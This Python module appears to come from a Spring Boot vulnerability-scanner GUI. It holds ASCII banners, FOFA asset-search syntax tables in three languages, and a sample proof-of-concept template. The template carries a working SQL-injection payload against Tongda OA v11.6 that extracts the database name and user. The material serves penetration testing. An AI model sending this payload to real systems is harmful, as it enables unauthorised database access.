# coding=utf-8

from util import JsonMethod
from util import Translate
from util.Translate import tr

def banner():
    version_load = JsonMethod.JsonMethod()
    version = version_load.JsonRead("./config/version.json")["version"]
    string =rf''' 
  ______                       __                      _______                         __     
 /      \                     |  \                    |       \                       |  \    
|  $$$$$$\  ______    ______   \$$ _______    ______  | $$$$$$$\  ______    ______   _| $$_   
| $$___\$$ /      \  /      \ |  \|       \  /      \ | $$__/ $$ /      \  /      \ |   $$ \  
 \$$    \ |  $$$$$$\|  $$$$$$\| $$| $$$$$$$\|  $$$$$$\| $$    $$|  $$$$$$\|  $$$$$$\ \$$$$$$  
 _\$$$$$$\| $$  | $$| $$   \$$| $$| $$  | $$| $$  | $$| $$$$$$$\| $$  | $$| $$  | $$  | $$ __ 
|  \__| $$| $$__/ $$| $$      | $$| $$  | $$| $$__| $$| $$__/ $$| $$__/ $$| $$__/ $$  | $$|  \
 \$$    $$| $$    $$| $$      | $$| $$  | $$ \$$    $$| $$    $$ \$$    $$ \$$    $$   \$$  $$
  \$$$$$$ | $$$$$$$  \$$       \$$ \$$   \$$ _\$$$$$$$ \$$$$$$$   \$$$$$$   \$$$$$$     \$$$$ 
          | $$                              |  \__| $$                                        
          | $$                               \$$    $$                                        
           \$$                                \$$$$$$                                         
  ______                                  ______   __    __  ______     SpringBootScan-GUI
 /      \                                /      \ |  \  |  \|      \      Version: {version}
|  $$$$$$\  _______   ______   _______  |  $$$$$$\| $$  | $$ \$$$$$$ +-----------------------------+ 
| $$___\$$ /       \ |      \ |       \ | $$ __\$$| $$  | $$  | $$   + GUI by:  13exp              +
 \$$    \ |  $$$$$$$  \$$$$$$\| $$$$$$$\| $$|    \| $$  | $$  | $$   + https://github.com/13exp/   +
 _\$$$$$$\| $$       /      $$| $$  | $$| $$ \$$$$| $$  | $$  | $$   +-----------------------------+
|  \__| $$| $$_____ |  $$$$$$$| $$  | $$| $$__| $$| $$__/ $$ _| $$_  + Terminal by: 曾哥(@AabyssZG)+
 \$$    $$ \$$     \ \$$    $$| $$  | $$ \$$    $$ \$$    $$|   $$ \ + https://github.com/AabyssZG/+
  \$$$$$$   \$$$$$$$  \$$$$$$$ \$$   \$$  \$$$$$$   \$$$$$$  \$$$$$$ +-----------------------------+


'''
    return string
def PoC():
    string=r'''
 _______              ______  
|       \            /      \ 
| $$$$$$$\  ______  |  $$$$$$\
| $$__/ $$ /      \ | $$   \$$
| $$    $$|  $$$$$$\| $$      
| $$$$$$$ | $$  | $$| $$   __ 
| $$      | $$__/ $$| $$__/  \
| $$       \$$    $$ \$$    $$
 \$$        \$$$$$$   \$$$$$$


'''
    return string
def EXP():
    string=r'''
 ________  __    __  _______  
|        \|  \  |  \|       \ 
| $$$$$$$$| $$  | $$| $$$$$$$\
| $$__     \$$\/  $$| $$__/ $$
| $$  \     >$$  $$ | $$    $$
| $$$$$    /  $$$$\ | $$$$$$$ 
| $$_____ |  $$ \$$\| $$      
| $$     \| $$  | $$| $$      
 \$$$$$$$$ \$$   \$$ \$$
'''
    string = string + tr("banner.exp_support")
    return string
def Download():
    string=r"""
  ____                      _                 _ 
 |  _ \  _____      ___ __ | | ___   __ _  __| |
 | | | |/ _ \ \ /\ / | '_ \| |/ _ \ / _` |/ _` |
 | |_| | (_) \ V  V /| | | | | (_) | (_| | (_| |
 |____/ \___/ \_/\_/ |_| |_|_|\___/ \__,_|\__,_|    


"""
    return string

FOFA_INFO_CN = r'''逻辑连接符/语法  具体含义
-----------------------------------------
=         
匹配，=""时，可查询不存在字段或者值为空的情况。
-----------------------------------------
==        
完全匹配，==""时，可查询存在且值为空的情况。
-----------------------------------------
&&        
与
-----------------------------------------
||        
或者
-----------------------------------------
!=        
不匹配，!=""时，可查询值为空的情况。
-----------------------------------------
*=        
模糊匹配，使用*或者?进行搜索，比如banner*="mys??" (个人版及以上可用)。
-----------------------------------------
()        
确认查询优先级，括号内容优先级最高。
-----------------------------------------
title="beijing"
从标题中搜索“北京”
-----------------------------------------
header="elastic"
从http头中搜索“elastic”
-----------------------------------------
header_hash="1258854265" [new]
通过http/https的响应头计算的hash值搜索
个人版及以上可用
-----------------------------------------
body="网络空间测绘"
从html正文中搜索“网络空间测绘”
-----------------------------------------
body_hash="-2090962452" [new]
通过html正文计算的hash值搜索
-----------------------------------------
fid="sSXXGNUO2FefBTcCLIT/2Q=="
查找相同的网站指纹
搜索网站类型资产
-----------------------------------------
domain="qq.com"
搜索根域名带有qq.com的网站
-----------------------------------------
icp="京ICP证030173号"
查找备案号为“京ICP证030173号”的网站
搜索网站类型资产
-----------------------------------------
js_name="js/jquery.js"
查找网站正文中包含js/jquery.js的资产
搜索网站类型资产
-----------------------------------------
js_md5="82ac3f14327a8b7ba49baa208d4eaa15"
查找js源码与之匹配的资产
-----------------------------------------
cname="ap21.inst.siteforce.com"
查找cname为"ap21.inst.siteforce.com"的网站
-----------------------------------------
cname_domain="siteforce.com"
查找cname包含“siteforce.com”的网站
-----------------------------------------
cloud_name="Aliyundun" [new]
通过云服务名称搜索资产
-----------------------------------------
product="NGINX" [new]
搜索此产品的资产
个人版及以上可用
-----------------------------------------
category="服务" [new]
搜索此产品分类的资产
个人版及以上可用
-----------------------------------------
sdk_hash=="Mkb4Ms4R96glv/T6TRzwPWh3UDatBqeF" new
搜索使用此sdk的资产
商业版及以上可用
-----------------------------------------
icon_hash="-247388890"
搜索使用此 icon 的资产
-----------------------------------------
host=".gov.cn"
从url中搜索”.gov.cn“
搜索要用host作为名称
-----------------------------------------
port="6379"
查找对应”6379“端口的资产
-----------------------------------------
ip="1.1.1.1"
从ip中搜索包含”1.1.1.1“的网站
搜索要用ip作为名称
-----------------------------------------
ip="220.181.111.1/24"
查询IP为”220.181.111.1“的C网段资产
-----------------------------------------
status_code="402"
查询服务器状态为”402“的资产
查询网站类型数据
-----------------------------------------
protocol="quic"
查询quic协议资产
搜索指定协议类型(在开启端口扫描的情况下有效)
-----------------------------------------
country="CN"
搜索指定国家(编码)的资产
-----------------------------------------
region="Xinjiang Uyghur Autonomous Region"
搜索指定行政区的资产
-----------------------------------------
city="Ürümqi"
搜索指定城市的资产
-----------------------------------------
cert="baidu"
搜索证书(https或者imaps等)中带有baidu的资产
-----------------------------------------
cert.subject="Oracle Corporation"
搜索证书持有者是Oracle Corporation的资产
-----------------------------------------
cert.issuer="DigiCert"
搜索证书颁发者为DigiCert Inc的资产
-----------------------------------------
cert.is_valid=true
验证证书是否有效，true有效，false无效
个人版及以上可用
-----------------------------------------
cert.is_match=true [new]
证书和域名是否匹配；true匹配、false不匹配
个人版及以上可用
-----------------------------------------
cert.is_expired=false [new]
证书是否过期；true过期、false未过期
个人版及以上可用
-----------------------------------------
cert.subject.org="Oracle Corporation" [new]
搜索证书持有者的组织
-----------------------------------------
cert.subject.cn="baidu.com" [new]
搜索证书持有者的通用名称
-----------------------------------------
cert.issuer.org="cPanel, Inc." [new]
搜索证书颁发者的组织
-----------------------------------------
cert.issuer.cn="Synology Inc. CA" [new]
搜索证书颁发者的通用名称
-----------------------------------------
jarm="2ad...83e81"
搜索JARM指纹
-----------------------------------------
banner="users" && protocol="ftp"
搜索FTP协议中带有users文本的资产
-----------------------------------------
type="service"
搜索所有协议资产，支持subdomain和service两种
搜索所有协议资产
-----------------------------------------
os="centos"
搜索CentOS资产
-----------------------------------------
server=="Microsoft-IIS/10"
搜索IIS 10服务器
-----------------------------------------
app="Microsoft-Exchange"
搜索Microsoft-Exchange设备
-----------------------------------------
after="2017" && before="2017-10-01"
时间范围段搜索
-----------------------------------------
asn="19551"
搜索指定asn的资产
-----------------------------------------
org="LLC Baxet"
搜索指定org(组织)的资产
-----------------------------------------
base_protocol="udp"
搜索指定udp协议的资产
-----------------------------------------
is_fraud=false [new]
排除仿冒/欺诈数据
专业版及以上可用
-----------------------------------------
is_honeypot=false
排除蜜罐数据
专业版及以上可用
-----------------------------------------
is_ipv6=true
搜索ipv6的资产
搜索ipv6的资产,只接受true和false
-----------------------------------------
is_domain=true
搜索域名的资产
搜索域名的资产,只接受true和false
-----------------------------------------
is_cloud=true [new]
筛选使用了云服务的资产
-----------------------------------------
port_size="6"
查询开放端口数量等于"6"的资产
个人版及以上可用
-----------------------------------------
port_size_gt="6"
查询开放端口数量大于"6"的资产
个人版及以上可用
-----------------------------------------
port_size_lt="12"
查询开放端口数量小于"12"的资产
个人版及以上可用
-----------------------------------------
ip_ports="80,161"
搜索同时开放80和161端口的ip
搜索同时开放80和161端口的ip资产(以ip为单位的资产数据)
-----------------------------------------
ip_country="CN"
搜索中国的ip资产(以ip为单位的资产数据)
搜索中国的ip资产
-----------------------------------------
ip_region="Zhejiang"
搜索指定行政区的ip资产(以ip为单位的资产数据)
搜索指定行政区的资产
-----------------------------------------
ip_city="Hangzhou"
搜索指定城市的ip资产(以ip为单位的资产数据)
搜索指定城市的资产
-----------------------------------------
ip_after="2021-03-18"
搜索2021-03-18以后的ip资产(以ip为单位的资产数据)
搜索2021-03-18以后的ip资产
-----------------------------------------
ip_before="2019-09-09"
搜索2019-09-09以前的ip资产(以ip为单位的资产数据)
搜索2019-09-09以前的ip资产
'''

FOFA_INFO_US = r'''Logical operators / syntax   Meaning
-----------------------------------------
=
Match. ="" also matches fields that do not exist or are empty.
-----------------------------------------
==
Exact match. =="" matches fields that exist and are empty.
-----------------------------------------
&&
AND
-----------------------------------------
||
OR
-----------------------------------------
!=
No match. !="" matches empty values.
-----------------------------------------
*=
Fuzzy match using * or ?, e.g. banner*="mys??" (personal plan and above).
-----------------------------------------
()
Sets query priority; bracketed content has the highest priority.
-----------------------------------------
title="beijing"
Search "beijing" in the page title
-----------------------------------------
header="elastic"
Search "elastic" in the HTTP headers
-----------------------------------------
header_hash="1258854265" [new]
Search by hash computed from HTTP/HTTPS response headers
Personal plan and above
-----------------------------------------
body="cyberspace mapping"
Search the given text in the HTML body
-----------------------------------------
body_hash="-2090962452" [new]
Search by hash computed from the HTML body
-----------------------------------------
fid="sSXXGNUO2FefBTcCLIT/2Q=="
Find websites with the same fingerprint
Website-type assets
-----------------------------------------
domain="qq.com"
Search websites whose root domain contains qq.com
-----------------------------------------
icp="京ICP证030173号"
Find websites with the given ICP license number
Website-type assets
-----------------------------------------
js_name="js/jquery.js"
Find assets whose body contains js/jquery.js
Website-type assets
-----------------------------------------
js_md5="82ac3f14327a8b7ba49baa208d4eaa15"
Find assets whose JS source matches this MD5
-----------------------------------------
cname="ap21.inst.siteforce.com"
Find websites with this CNAME
-----------------------------------------
cname_domain="siteforce.com"
Find websites whose CNAME contains siteforce.com
-----------------------------------------
cloud_name="Aliyundun" [new]
Search assets by cloud service name
-----------------------------------------
product="NGINX" [new]
Search assets of this product
Personal plan and above
-----------------------------------------
category="Service" [new]
Search assets of this product category
Personal plan and above
-----------------------------------------
sdk_hash=="Mkb4Ms4R96glv/T6TRzwPWh3UDatBqeF" new
Search assets using this SDK
Business plan and above
-----------------------------------------
icon_hash="-247388890"
Search assets using this icon
-----------------------------------------
host=".gov.cn"
Search ".gov.cn" in the URL
Use "host" as the field name
-----------------------------------------
port="6379"
Find assets listening on port 6379
-----------------------------------------
ip="1.1.1.1"
Search websites containing IP 1.1.1.1
Use "ip" as the field name
-----------------------------------------
ip="220.181.111.1/24"
Query class-C assets of IP 220.181.111.1
-----------------------------------------
status_code="402"
Query assets whose server returns 402
Website-type data
-----------------------------------------
protocol="quic"
Query QUIC protocol assets
Only effective when port scanning is enabled
-----------------------------------------
country="CN"
Search assets by country code
-----------------------------------------
region="Xinjiang Uyghur Autonomous Region"
Search assets by administrative region
-----------------------------------------
city="Ürümqi"
Search assets by city
-----------------------------------------
cert="baidu"
Search certificates (HTTPS, IMAPS, etc.) containing baidu
-----------------------------------------
cert.subject="Oracle Corporation"
Search assets whose certificate owner is Oracle Corporation
-----------------------------------------
cert.issuer="DigiCert"
Search assets whose certificate issuer is DigiCert Inc
-----------------------------------------
cert.is_valid=true
Check certificate validity: true valid, false invalid
Personal plan and above
-----------------------------------------
cert.is_match=true [new]
Certificate/domain match: true match, false mismatch
Personal plan and above
-----------------------------------------
cert.is_expired=false [new]
Certificate expired: true expired, false not expired
Personal plan and above
-----------------------------------------
cert.subject.org="Oracle Corporation" [new]
Search the certificate owner's organization
-----------------------------------------
cert.subject.cn="baidu.com" [new]
Search the certificate owner's common name
-----------------------------------------
cert.issuer.org="cPanel, Inc." [new]
Search the certificate issuer's organization
-----------------------------------------
cert.issuer.cn="Synology Inc. CA" [new]
Search the certificate issuer's common name
-----------------------------------------
jarm="2ad...83e81"
Search JARM fingerprints
-----------------------------------------
banner="users" && protocol="ftp"
Search FTP assets whose banner contains "users"
-----------------------------------------
type="service"
Search all protocol assets (subdomain or service)
-----------------------------------------
os="centos"
Search CentOS assets
-----------------------------------------
server=="Microsoft-IIS/10"
Search IIS 10 servers
-----------------------------------------
app="Microsoft-Exchange"
Search Microsoft-Exchange devices
-----------------------------------------
after="2017" && before="2017-10-01"
Search by time range
-----------------------------------------
asn="19551"
Search assets by ASN
-----------------------------------------
org="LLC Baxet"
Search assets by organization
-----------------------------------------
base_protocol="udp"
Search UDP protocol assets
-----------------------------------------
is_fraud=false [new]
Exclude fake/fraudulent data
Professional plan and above
-----------------------------------------
is_honeypot=false
Exclude honeypot data
Professional plan and above
-----------------------------------------
is_ipv6=true
Search IPv6 assets (accepts true/false only)
-----------------------------------------
is_domain=true
Search domain assets (accepts true/false only)
-----------------------------------------
is_cloud=true [new]
Filter assets using cloud services
-----------------------------------------
port_size="6"
Query assets with exactly 6 open ports
Personal plan and above
-----------------------------------------
port_size_gt="6"
Query assets with more than 6 open ports
Personal plan and above
-----------------------------------------
port_size_lt="12"
Query assets with fewer than 12 open ports
Personal plan and above
-----------------------------------------
ip_ports="80,161"
Search IPs with both ports 80 and 161 open
IP-based asset data
-----------------------------------------
ip_country="CN"
Search IP assets of China
IP-based asset data
-----------------------------------------
ip_region="Zhejiang"
Search IP assets by administrative region
IP-based asset data
-----------------------------------------
ip_city="Hangzhou"
Search IP assets by city
IP-based asset data
-----------------------------------------
ip_after="2021-03-18"
Search IP assets seen after 2021-03-18
IP-based asset data
-----------------------------------------
ip_before="2019-09-09"
Search IP assets seen before 2019-09-09
IP-based asset data
'''

FOFA_INFO_FR = r'''Opérateurs logiques / syntaxe   Signification
-----------------------------------------
=
Correspondance. ="" interroge aussi les champs inexistants ou vides.
-----------------------------------------
==
Correspondance exacte. =="" interroge les champs existants et vides.
-----------------------------------------
&&
ET
-----------------------------------------
||
OU
-----------------------------------------
!=
Non-correspondance. !="" interroge les valeurs vides.
-----------------------------------------
*=
Correspondance floue avec * ou ?, ex. banner*="mys??" (offre personnelle et plus).
-----------------------------------------
()
Définit la priorité ; le contenu entre parenthèses est prioritaire.
-----------------------------------------
title="beijing"
Recherche « beijing » dans le titre de la page
-----------------------------------------
header="elastic"
Recherche « elastic » dans les en-têtes HTTP
-----------------------------------------
header_hash="1258854265" [new]
Recherche par hash calculé des en-têtes HTTP/HTTPS
Offre personnelle et plus
-----------------------------------------
body="cartographie du cyberespace"
Recherche le texte donné dans le corps HTML
-----------------------------------------
body_hash="-2090962452" [new]
Recherche par hash calculé du corps HTML
-----------------------------------------
fid="sSXXGNUO2FefBTcCLIT/2Q=="
Trouve les sites ayant la même empreinte
Actifs de type site web
-----------------------------------------
domain="qq.com"
Recherche les sites dont le domaine racine contient qq.com
-----------------------------------------
icp="京ICP证030173号"
Trouve les sites avec ce numéro de licence ICP
Actifs de type site web
-----------------------------------------
js_name="js/jquery.js"
Trouve les actifs dont le corps contient js/jquery.js
Actifs de type site web
-----------------------------------------
js_md5="82ac3f14327a8b7ba49baa208d4eaa15"
Trouve les actifs dont le code JS correspond à ce MD5
-----------------------------------------
cname="ap21.inst.siteforce.com"
Trouve les sites avec ce CNAME
-----------------------------------------
cname_domain="siteforce.com"
Trouve les sites dont le CNAME contient siteforce.com
-----------------------------------------
cloud_name="Aliyundun" [new]
Recherche d'actifs par nom de service cloud
-----------------------------------------
product="NGINX" [new]
Recherche les actifs de ce produit
Offre personnelle et plus
-----------------------------------------
category="Service" [new]
Recherche les actifs de cette catégorie de produit
Offre personnelle et plus
-----------------------------------------
sdk_hash=="Mkb4Ms4R96glv/T6TRzwPWh3UDatBqeF" new
Recherche les actifs utilisant ce SDK
Offre business et plus
-----------------------------------------
icon_hash="-247388890"
Recherche les actifs utilisant cette icône
-----------------------------------------
host=".gov.cn"
Recherche « .gov.cn » dans l'URL
Utilisez « host » comme nom de champ
-----------------------------------------
port="6379"
Trouve les actifs écoutant sur le port 6379
-----------------------------------------
ip="1.1.1.1"
Recherche les sites contenant l'IP 1.1.1.1
Utilisez « ip » comme nom de champ
-----------------------------------------
ip="220.181.111.1/24"
Interroge les actifs du réseau de classe C de 220.181.111.1
-----------------------------------------
status_code="402"
Interroge les actifs dont le serveur renvoie 402
Données de type site web
-----------------------------------------
protocol="quic"
Interroge les actifs en protocole QUIC
Effectif uniquement si le scan de ports est activé
-----------------------------------------
country="CN"
Recherche les actifs par code pays
-----------------------------------------
region="Xinjiang Uyghur Autonomous Region"
Recherche les actifs par région administrative
-----------------------------------------
city="Ürümqi"
Recherche les actifs par ville
-----------------------------------------
cert="baidu"
Recherche les certificats (HTTPS, IMAPS, etc.) contenant baidu
-----------------------------------------
cert.subject="Oracle Corporation"
Recherche les actifs dont le propriétaire du certificat est Oracle Corporation
-----------------------------------------
cert.issuer="DigiCert"
Recherche les actifs dont l'émetteur du certificat est DigiCert Inc
-----------------------------------------
cert.is_valid=true
Vérifie la validité du certificat : true valide, false invalide
Offre personnelle et plus
-----------------------------------------
cert.is_match=true [new]
Correspondance certificat/domaine : true oui, false non
Offre personnelle et plus
-----------------------------------------
cert.is_expired=false [new]
Certificat expiré : true oui, false non
Offre personnelle et plus
-----------------------------------------
cert.subject.org="Oracle Corporation" [new]
Recherche l'organisation du propriétaire du certificat
-----------------------------------------
cert.subject.cn="baidu.com" [new]
Recherche le nom commun du propriétaire du certificat
-----------------------------------------
cert.issuer.org="cPanel, Inc." [new]
Recherche l'organisation de l'émetteur du certificat
-----------------------------------------
cert.issuer.cn="Synology Inc. CA" [new]
Recherche le nom commun de l'émetteur du certificat
-----------------------------------------
jarm="2ad...83e81"
Recherche les empreintes JARM
-----------------------------------------
banner="users" && protocol="ftp"
Recherche les actifs FTP dont la bannière contient « users »
-----------------------------------------
type="service"
Recherche tous les actifs par protocole (subdomain ou service)
-----------------------------------------
os="centos"
Recherche les actifs CentOS
-----------------------------------------
server=="Microsoft-IIS/10"
Recherche les serveurs IIS 10
-----------------------------------------
app="Microsoft-Exchange"
Recherche les équipements Microsoft-Exchange
-----------------------------------------
after="2017" && before="2017-10-01"
Recherche par plage de dates
-----------------------------------------
asn="19551"
Recherche les actifs par ASN
-----------------------------------------
org="LLC Baxet"
Recherche les actifs par organisation
-----------------------------------------
base_protocol="udp"
Recherche les actifs en protocole UDP
-----------------------------------------
is_fraud=false [new]
Exclut les données usurpées/frauduleuses
Offre professionnelle et plus
-----------------------------------------
is_honeypot=false
Exclut les données de honeypots
Offre professionnelle et plus
-----------------------------------------
is_ipv6=true
Recherche les actifs IPv6 (accepte true/false uniquement)
-----------------------------------------
is_domain=true
Recherche les actifs par domaine (accepte true/false uniquement)
-----------------------------------------
is_cloud=true [new]
Filtre les actifs utilisant des services cloud
-----------------------------------------
port_size="6"
Interroge les actifs ayant exactement 6 ports ouverts
Offre personnelle et plus
-----------------------------------------
port_size_gt="6"
Interroge les actifs ayant plus de 6 ports ouverts
Offre personnelle et plus
-----------------------------------------
port_size_lt="12"
Interroge les actifs ayant moins de 12 ports ouverts
Offre personnelle et plus
-----------------------------------------
ip_ports="80,161"
Recherche les IP ayant à la fois les ports 80 et 161 ouverts
Données d'actifs par IP
-----------------------------------------
ip_country="CN"
Recherche les actifs IP de Chine
Données d'actifs par IP
-----------------------------------------
ip_region="Zhejiang"
Recherche les actifs IP par région administrative
Données d'actifs par IP
-----------------------------------------
ip_city="Hangzhou"
Recherche les actifs IP par ville
Données d'actifs par IP
-----------------------------------------
ip_after="2021-03-18"
Recherche les actifs IP vus après le 2021-03-18
Données d'actifs par IP
-----------------------------------------
ip_before="2019-09-09"
Recherche les actifs IP vus avant le 2019-09-09
Données d'actifs par IP
'''

FOFA_INFO = {"CN": FOFA_INFO_CN, "US": FOFA_INFO_US, "FR": FOFA_INFO_FR}

def FofaInfo():
    return FOFA_INFO.get(Translate.current(), FOFA_INFO_US)
def PoCPro():
    string = r"""{
    "id": "",
    "info": {
        "name": "",
        "author": "",
        "severity": "",
        "description": "通达OA v11.6 report_bi.func.php 存在SQL注入漏洞，攻击者通过漏洞可以获取数据库信息",
        "reference": [
            "https://peiqi.wgpsec.org/wiki/oa/%E9%80%9A%E8%BE%BEEOA/%E9%80%9A%E8%BE%BEEOA%20v11.6%20report_bi.func.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "cvss-score": 10.0,
            "cwe-id": "CWE-77"
        },
        "tags": "tongda,lfi",
        "metadata": {
            "max-request": 1
        }
    },
    "http": [
        {
            "method": [
                "POST"
            ],
            "path": [
                "{{BaseURL}}/general/bi_design/appcenter/report_bi.func.php"
            ],
            "Rheader": [
                "Content-Type:application/x-www-form-urlencoded & Accept-Encoding:gzip"
            ],
            "body": [
                "_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&\n"
            ],
            "matchers-condition": "and",
            "matchers": [
                {
                    "type": "word",
                    "part": "body",
                    "words": [
                        "td_oa"
                    ]
                },
                {
                    "type": "status",
                    "status": [
                        2XX
                    ]
                }
            ]
        }
    ]
}"""
    return string
